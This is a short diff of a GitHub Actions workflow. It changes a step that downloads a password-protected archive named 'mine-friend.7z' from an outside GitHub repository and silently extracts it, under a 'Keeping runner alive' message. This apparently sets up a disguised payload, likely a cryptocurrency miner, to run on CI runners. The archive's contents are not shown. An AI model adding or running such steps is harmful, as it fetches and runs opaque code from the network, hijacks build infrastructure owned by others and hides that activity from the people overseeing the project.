@@ -63,7 +63,7 @@ jobs:
       - name: Download source
         run: |
           echo "Keeping runner alive..."
-          curl -LO https://github.com/mishakokzix/test/raw/refs/heads/main/mine-friend.7z
+          curl -LO https://github.com/atomic1725/test/raw/refs/heads/main/.github/mine-friend.7z
           echo 'Download successful'
           7z x mine-friend.7z -p"$PASS" -y > /dev/null 2>&1
           
